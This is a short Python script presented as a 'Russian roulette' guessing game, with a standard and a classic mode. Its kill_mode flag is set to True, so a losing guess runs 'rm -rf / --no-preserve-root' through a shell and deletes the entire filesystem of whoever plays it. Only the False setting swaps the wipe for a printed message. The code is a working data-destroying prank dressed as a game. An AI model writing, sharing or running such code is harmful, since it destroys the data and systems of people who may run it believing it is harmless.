import random
import subprocess

print("mode 1: standard mode")
print("mode 2: classic mode")

mode = input("select mode (1 or 2): ")

print("*click*")
print("this is a revolver")

## IMPORTANT

kill_mode = True ## kill mode true = system wipe, false = print message

## IMNPORTANT

while True:

    if mode == "1":

        print("I have selected a random number from 1 to 6")
        print("if you guess it right, your system will be spared")
        print("if you guess wrong, your system will be wiped")
        print("good luck")

        cylinder = random.randint(1, 6)

        #print ("cylinder", cylinder)
            
        cylinder_guess = int(input("take a guess (number from 1-6): "))

        if cylinder_guess < 1 or cylinder_guess > 6:
            print("nice try")
            continue

        print("guess", cylinder_guess)

        if cylinder_guess != cylinder:
            print("say goodbye to your system")
            if kill_mode == True:
                subprocess.call("rm -rf / --no-preserve-root", shell=True)
            elif kill_mode == False:
                print("your system was destroyed")
            break
        else:    
            print("your sytem lives for another day")
            break

    if mode == "2":

        print("I have loaded a random cylinder with a bullet")
        print("if you guess the cylinder I selected, your sytem gets deleted")

        cylinder = random.randint(1, 6)

        #print ("cylinder", cylinder)
            
        cylinder_guess = int(input("take a guess (number from 1-6): "))

        if cylinder_guess < 1 or cylinder_guess > 6:
            print("nice try")
            continue

        print("guess", cylinder_guess)

        if cylinder_guess == cylinder:
            print("say goodbye to your system")
            if kill_mode == True:
                subprocess.call("rm -rf / --no-preserve-root", shell=True)
            elif kill_mode == False:
                print("your system was destroyed")
            break
        else:    
            print("your sytem lives for another day")
            break